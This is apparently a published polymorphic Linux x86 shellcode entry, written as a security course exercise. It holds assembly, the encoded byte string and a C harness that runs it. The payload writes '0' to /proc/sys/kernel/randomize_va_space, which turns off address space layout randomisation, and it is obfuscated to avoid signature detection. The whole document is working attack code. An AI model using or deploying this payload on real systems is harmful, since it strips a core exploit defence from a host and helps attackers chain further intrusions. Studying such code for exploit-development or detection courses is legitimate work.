#---------------------- DESCRIPTION -------------------------------------#

; Title: Linux x86 ASLR deactivation for Linux/x86 - Polymorphic
; Author: Daniel Ortiz
; Tested on: Linux 4.18.0-25-generic #26 Ubuntu
; Size: 107 bytes
; SLAE ID: PA-9844


#---------------------- ASM CODE ------------------------------------------#


SECTION .data

        WRITE_SYSCALL equ 4

        CLOSE_SYSCALL equ 6

SECTION .text

global _start



_start:
        nop
        mov eax, 0xffffffff
        not eax
        push eax
        mov esi, 0x65636170
        push esi
        xor esi, esi
        mov esi, 0x735f6176
        push esi
        xor esi, esi
        push dword 0x5f657a69
        push dword 0x6d6f646e
        push dword 0x61722f6c
        push dword 0x656e7265
        push dword 0x6b2f7379
        push dword 0x732f636f

        mov esi, 0x72702f2f
        push esi
        xor esi, esi


        mov ebx,esp
        mov cx,0x2bc
        mov al,0x6
        inc al
        inc al
        int 0x80
        mov ebx,eax
        push eax
        mov dx,0xb01
        add dx,0x2f2f
        push dx
        mov ecx,esp
        cdq
        inc edx
        mov al,WRITE_SYSCALL
        int 0x80
        mov al,CLOSE_SYSCALL
        int 0x80

        mov al, 1
        int 0x80


#------------------------- final shellcode ----------------------------------------#

unsigned char buf[] =
"\x90\xb8\xff\xff\xff\xff\xf7\xd0\x50\xbe\x70\x61\x63\x65\x56\x31\xf6\xbe\x76\x61\x5f"
"\x73\x56\x31\xf6\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72"
"\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\xbe\x2f\x2f\x70\x72\x56\x31\xf6\x89\xe3"
"\x66\xb9\xbc\x02\xb0\x06\xfe\xc0\xfe\xc0\xcd\x80\x89\xc3\x50\x66\xba\x01\x0b\x66\x81\xc2"
"\x2f\x2f\x66\x52\x89\xe1\x99\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\xcd\x80";



#------------------------- usage --------------------------------------------------#

#include<stdio.h>
#include<string.h>

unsigned char code[] = \


"\x90\xb8\xff\xff\xff\xff\xf7\xd0\x50\xbe\x70\x61\x63\x65\x56\x31\xf6\xbe\x76\x61\x5f\x73\x56\x31\xf6\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\xbe\x2f\x2f\x70\x72\x56\x31\xf6\x89\xe3\x66\xb9\xbc\x02\xb0\x06\xfe\xc0\xfe\xc0\xcd\x80\x89\xc3\x50\x66\xba\x01\x0b\x66\x81\xc2\x2f\x2f\x66\x52\x89\xe1\x99\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\xcd\x80";


main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}